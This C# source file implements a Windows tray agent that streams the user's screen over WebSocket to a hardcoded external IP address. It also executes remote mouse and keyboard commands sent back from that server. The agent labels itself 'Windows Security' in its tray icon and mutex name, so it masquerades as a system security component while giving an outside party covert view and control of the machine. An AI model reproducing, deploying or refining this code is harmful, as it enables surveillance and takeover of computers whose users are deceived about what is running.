using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Net.WebSockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Windows.Forms;
using DrawingEncoder = System.Drawing.Imaging.Encoder;

internal static class Program
{
    [STAThread]
    private static void Main(string[] args)
    {
        using var singleInstance = new Mutex(true, @"Local\Windows SecurityWindows SecurityWindows Securityserviceshras_test_123", out var createdNew);
        if (!createdNew)
        {
            return;
        }

        Application.SetHighDpiMode(HighDpiMode.PerMonitorV2);
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);

        var options = AgentOptions.Parse(args);
        Application.Run(new ReceiverTrayContext(options));
    }

    internal static async Task RunLoopAsync(
        AgentOptions options,
        Action<string> setStatus,
        CancellationToken cancellationToken)
    {
        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {
                await RunAgentAsync(options, setStatus, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch (Exception ex)
            {
                setStatus($"Connection failed: {DescribeConnectionError(ex)}");
                await Task.Delay(TimeSpan.FromSeconds(3), cancellationToken);
            }
        }
    }

    private static string DescribeConnectionError(Exception ex)
    {
        if (ex.Message.Contains("401", StringComparison.OrdinalIgnoreCase))
        {
            return "Unauthorized (401). The embedded access code must match HRAS_ACCESS_CODE on the office server.";
        }

        if (ex.Message.Contains("404", StringComparison.OrdinalIgnoreCase))
        {
            return "Not found (404). Make sure the office server is running the latest server.js with the /frames endpoint.";
        }

        return ex.Message;
    }

    private static async Task RunAgentAsync(
        AgentOptions options,
        Action<string> setStatus,
        CancellationToken cancellationToken)
    {
        using var socket = new ClientWebSocket();
        var endpoint = options.BuildEndpoint();

        setStatus($"Connecting to {endpoint.Host}:{endpoint.Port}");
        await socket.ConnectAsync(endpoint, cancellationToken);
        setStatus("Connected. Screen sharing is active.");

        var metadata = JsonSerializer.Serialize(new
        {
            type = "agent-ready",
            machine = Environment.MachineName,
            fps = options.Fps,
            quality = options.Quality,
        });
        await socket.SendAsync(
            Encoding.UTF8.GetBytes(metadata),
            WebSocketMessageType.Text,
            true,
            cancellationToken);

        var receiveTask = ReceiveLoopAsync(socket, options, cancellationToken);
        var sendTask = SendLoopAsync(socket, options, cancellationToken);
        var completedTask = await Task.WhenAny(receiveTask, sendTask);
        await completedTask; // Re-throw any exceptions from the faulted task
    }

    private static async Task SendLoopAsync(ClientWebSocket socket, AgentOptions options, CancellationToken cancellationToken)
    {
        var frameDelay = TimeSpan.FromMilliseconds(1000.0 / options.Fps);
        while (socket.State == WebSocketState.Open && !cancellationToken.IsCancellationRequested)
        {
            var startedAt = DateTimeOffset.UtcNow;
            var frame = CaptureJpeg(options);

            await socket.SendAsync(
                frame,
                WebSocketMessageType.Binary,
                true,
                cancellationToken);

            var elapsed = DateTimeOffset.UtcNow - startedAt;
            if (elapsed < frameDelay)
            {
                await Task.Delay(frameDelay - elapsed, cancellationToken);
            }
        }
    }

    private static async Task ReceiveLoopAsync(ClientWebSocket socket, AgentOptions options, CancellationToken cancellationToken)
    {
        var buffer = new byte[8192];
        while (socket.State == WebSocketState.Open && !cancellationToken.IsCancellationRequested)
        {
            using var ms = new MemoryStream();
            WebSocketReceiveResult result;
            do
            {
                result = await socket.ReceiveAsync(new ArraySegment<byte>(buffer), cancellationToken);
                if (result.MessageType == WebSocketMessageType.Close) break;
                ms.Write(buffer, 0, result.Count);
            } while (!result.EndOfMessage);

            if (result.MessageType == WebSocketMessageType.Close) break;
            
            if (result.MessageType == WebSocketMessageType.Text)
            {
                try
                {
                    var text = Encoding.UTF8.GetString(ms.ToArray());
                    using var doc = JsonDocument.Parse(text);
                    var root = doc.RootElement;
                    if (root.TryGetProperty("type", out var typeElement) && typeElement.GetString() == "control")
                    {
                        var action = root.GetProperty("action").GetString();
                        if (action == "mousemove")
                        {
                            var x = root.GetProperty("x").GetDouble();
                            var y = root.GetProperty("y").GetDouble();
                            InputSimulator.MoveMouse(x, y, options.Monitor);
                        }
                        else if (action == "mousedown" || action == "mouseup")
                        {
                            var button = root.GetProperty("button").GetInt32();
                            InputSimulator.MouseClick(button, action == "mousedown");
                        }
                        else if (action == "keydown" || action == "keyup")
                        {
                            var keyCode = root.GetProperty("keyCode").GetByte();
                            InputSimulator.KeyPress(keyCode, action == "keydown");
                        }
                    }
                }
                catch
                {
                    // Ignore malformed messages
                }
            }
        }
    }

    private static byte[] CaptureJpeg(AgentOptions options)
    {
        var screens = Screen.AllScreens;
        var screenIndex = Math.Clamp(options.Monitor, 0, screens.Length - 1);
        var bounds = screens[screenIndex].Bounds;

        using var source = new Bitmap(bounds.Width, bounds.Height);
        using (var graphics = Graphics.FromImage(source))
        {
            graphics.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
        }

        using var output = ResizeIfNeeded(source, options.MaxWidth);
        using var stream = new MemoryStream();
        var encoder = ImageCodecInfo.GetImageEncoders().First(codec => codec.FormatID == ImageFormat.Jpeg.Guid);
        using var encoderParameters = new EncoderParameters(1);
        encoderParameters.Param[0] = new EncoderParameter(DrawingEncoder.Quality, options.Quality);
        output.Save(stream, encoder, encoderParameters);
        return stream.ToArray();
    }

    private static Bitmap ResizeIfNeeded(Bitmap source, int maxWidth)
    {
        if (maxWidth <= 0 || source.Width <= maxWidth)
        {
            return new Bitmap(source);
        }

        var ratio = maxWidth / (double)source.Width;
        var width = maxWidth;
        var height = Math.Max(1, (int)Math.Round(source.Height * ratio));
        var resized = new Bitmap(width, height);

        using var graphics = Graphics.FromImage(resized);
        graphics.CompositingQuality = CompositingQuality.HighSpeed;
        graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
        graphics.SmoothingMode = SmoothingMode.HighSpeed;
        graphics.DrawImage(source, 0, 0, width, height);
        return resized;
    }
}

static class InputSimulator
{
    [DllImport("user32.dll")]
    static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
    
    [DllImport("user32.dll")]
    static extern bool SetCursorPos(int X, int Y);

    [DllImport("user32.dll", SetLastError = true)]
    static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

    const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
    const uint MOUSEEVENTF_LEFTUP = 0x0004;
    const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    const uint MOUSEEVENTF_RIGHTUP = 0x0010;
    const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
    const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
    const uint KEYEVENTF_KEYUP = 0x0002;

    public static void MoveMouse(double xRatio, double yRatio, int monitorIndex)
    {
        var screens = Screen.AllScreens;
        var screen = screens[Math.Clamp(monitorIndex, 0, screens.Length - 1)];
        var bounds = screen.Bounds;
        int x = bounds.Left + (int)(bounds.Width * xRatio);
        int y = bounds.Top + (int)(bounds.Height * yRatio);
        SetCursorPos(x, y);
    }

    public static void MouseClick(int button, bool isDown)
    {
        uint flag = 0;
        if (button == 0) flag = isDown ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
        else if (button == 1) flag = isDown ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
        else if (button == 2) flag = isDown ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
        if (flag != 0) mouse_event(flag, 0, 0, 0, 0);
    }

    public static void KeyPress(byte keyCode, bool isDown)
    {
        uint flag = isDown ? 0 : KEYEVENTF_KEYUP;
        keybd_event(keyCode, 0, flag, 0);
    }
}

sealed class ReceiverTrayContext : ApplicationContext
{
    private readonly CancellationTokenSource cancellation = new();
    private readonly NotifyIcon notifyIcon;
    private readonly Icon trayIcon;
    private readonly SynchronizationContext? uiContext;
    private readonly string logPath;

    public ReceiverTrayContext(AgentOptions options)
    {
        uiContext = SynchronizationContext.Current;
        logPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "HRAS",
            "receiver-agent.log");
        Directory.CreateDirectory(Path.GetDirectoryName(logPath)!);

        trayIcon = TrayIconFactory.Load();

        notifyIcon = new NotifyIcon
        {
            Icon = trayIcon,
            Text = "Windows Security",
            Visible = true,
        };

        _ = Task.Run(async () =>
        {
            try
            {
                await Program.RunLoopAsync(options, SetStatus, cancellation.Token);
            }
            catch (OperationCanceledException)
            {
                // Normal shutdown from an external stop action.
            }
        });
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing)
        {
            cancellation.Cancel();
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
            trayIcon.Dispose();
            cancellation.Dispose();
        }

        base.Dispose(disposing);
    }

    private void SetStatus(string message)
    {
        Log(message);
        uiContext?.Post(_ =>
        {
            notifyIcon.Text = message.Length <= 63 ? message : message[..60] + "...";
        }, null);
    }

    private void Log(string message)
    {
        File.AppendAllText(logPath, $"{DateTimeOffset.Now:u} {message}{Environment.NewLine}");
    }

}

static class TrayIconFactory
{
    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool DestroyIcon(IntPtr handle);

    public static Icon Load()
    {
        try
        {
            using var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("tray.png");
            if (stream is null)
            {
                return (Icon)SystemIcons.Application.Clone();
            }

            using var source = Image.FromStream(stream);
            using var iconBitmap = new Bitmap(32, 32, PixelFormat.Format32bppArgb);
            using (var graphics = Graphics.FromImage(iconBitmap))
            {
                graphics.Clear(Color.Transparent);
                graphics.CompositingQuality = CompositingQuality.HighQuality;
                graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
                graphics.SmoothingMode = SmoothingMode.HighQuality;
                graphics.DrawImage(source, 0, 0, 32, 32);
            }

            var iconHandle = iconBitmap.GetHicon();
            try
            {
                return (Icon)Icon.FromHandle(iconHandle).Clone();
            }
            finally
            {
                DestroyIcon(iconHandle);
            }
        }
        catch
        {
            return (Icon)SystemIcons.Application.Clone();
        }
    }
}

sealed record AgentOptions(
    string Server,
    string Room,
    string Code,
    int Fps,
    long Quality,
    int MaxWidth,
    int Monitor)
{
    public static AgentOptions Parse(string[] args)
    {
        var values = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        for (var index = 0; index < args.Length; index++)
        {
            var arg = args[index];
            if (!arg.StartsWith("--", StringComparison.Ordinal)) continue;

            var key = arg[2..];
            if (index + 1 < args.Length && !args[index + 1].StartsWith("--", StringComparison.Ordinal))
            {
                values[key] = args[++index];
            }
        }

        return new AgentOptions(
            Get(values, "server", EmbeddedDefaults.Server),
            Get(values, "room", EmbeddedDefaults.Room),
            Get(values, "code", EmbeddedDefaults.Code),
            ClampInt(Get(values, "fps", EmbeddedDefaults.Fps.ToString()), 1, 15),
            ClampInt(Get(values, "quality", EmbeddedDefaults.Quality.ToString()), 20, 90),
            ClampInt(Get(values, "max-width", EmbeddedDefaults.MaxWidth.ToString()), 640, 3840),
            ClampInt(Get(values, "monitor", EmbeddedDefaults.Monitor.ToString()), 0, 8));
    }

    public Uri BuildEndpoint()
    {
        var server = Server.TrimEnd('/');

        if (server.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
        {
            server = "ws://" + server["http://".Length..];
        }
        else if (server.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
        {
            server = "wss://" + server["https://".Length..];
        }

        if (!server.EndsWith("/frames", StringComparison.OrdinalIgnoreCase))
        {
            server += "/frames";
        }

        var separator = server.Contains('?') ? '&' : '?';
        var url = $"{server}{separator}role=agent&room={Uri.EscapeDataString(Room)}&code={Uri.EscapeDataString(Code)}";
        return new Uri(url);
    }

    private static string Get(IReadOnlyDictionary<string, string> values, string key, string fallback)
    {
        return values.TryGetValue(key, out var value) && !string.IsNullOrWhiteSpace(value) ? value : fallback;
    }

    private static int ClampInt(string value, int min, int max)
    {
        return int.TryParse(value, out var parsed) ? Math.Clamp(parsed, min, max) : min;
    }
}

static class EmbeddedDefaults
{
    public const string Server = "ws://198.105.113.144:8080";
    public const string Room = "head-office";
    public const string Code = "change-me";
    public const int Fps = 5;
    public const long Quality = 55;
    public const int MaxWidth = 1280;
    public const int Monitor = 0;
}








